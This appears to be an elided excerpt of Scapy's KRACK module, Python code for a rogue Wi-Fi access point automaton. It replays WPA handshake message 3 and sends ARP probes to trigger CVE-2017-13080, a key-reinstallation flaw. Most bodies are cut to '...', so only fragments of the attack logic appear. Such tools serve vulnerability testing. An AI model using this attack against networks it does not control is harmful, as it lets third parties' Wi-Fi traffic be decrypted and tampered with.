...
from scapy.modules.krack.crypto import (
    parse_data_pkt,
    parse_TKIP_hdr,
    build_TKIP_payload,
    check_MIC_ICV,
...
class KrackAP(Automaton):
    ...
    def parse_args(
        ...
        **kwargs
        ...
        self.dhcp_server = DHCPOverWPA(
            send_func=self.send_ether_over_wpa,
    ...
    def build_EAPOL_Key_8021X2004(
        ...
        final_payload = (
            payload[:offset_MIC] + mic + payload[offset_MIC + len(mic) :]
        )  # noqa: E501
    ...
    def deal_common_pkt(self, pkt):
        ...
        if SNAP in pkt:
            ether_pkt = (
                Ether(src=self.client, dst=self.mac) / pkt[SNAP].payload
            )  # noqa: E501
    ...
    def send_auth_response(self, pkt):
        ...
        rep /= Dot11Auth(
            seqnum=2, algo=pkt[Dot11Auth].algo, status=pkt[Dot11Auth].status
        )
    ...
    def assoc_received(self, pkt):
        if (
            Dot11AssoReq in pkt
            and pkt.addr1 == pkt.addr3 == self.mac
            and pkt[Dot11Elt::{"ID": 0}].info == self.ssid
        ):
    ...
    def send_wpa_handshake_3(self, pkt):
        ...
        client_data = raw(pkt[EAPOL]).replace(
            client_mic, b"\x00" * len(client_mic)
        )  # noqa: E501
        assert (
            hmac.new(self.kck, client_data, hashlib.md5).digest() == client_mic
        )  # noqa: E501
    ...
    def wpa_handshake_3_sent(self, pkt):
        ...
        if (
            EAPOL in pkt
            and pkt.addr1 == pkt.addr3 == self.mac
            and pkt[EAPOL].load[1:3] == b"\x03\x09"
        ):
    ...
    def krack_dispatch(self):
        ...
        if (
            self.double_3handshake
            and (self.krack_state & 1 == 0)
            and (now - self.time_handshake_end) > self.wait_3handshake
        ):
    ...
    def get_gtk_2(self, pkt):
        ...
        if (
            EAPOL in pkt_clear
            and pkt.addr1 == pkt.addr3 == self.mac
            and pkt_clear[EAPOL].load[1:3] == b"\x03\x01"
        ):
    ...
    def send_arp_req(self):
        ...
        if self.krack_state & 4 == 0:
            ...
            if self.arp_to_send < len(self.arp_sent):
                ...
                self.arp_retry += 1
                log_runtime.info(
                    "Trying to trigger CVE-2017-13080 %d/%d",
                    self.arp_retry,
                    self.ARP_MAX_RETRY,
                )
    ...
    def check_arp_reply(self, pkt):
        ...
        # ARP.op 2: is-at
        if (
            decoded_pkt[ARP].op == 2
            and decoded_pkt[ARP].psrc == self.arp_target_ip
            and decoded_pkt[ARP].pdst == self.arp_source_ip
        ):
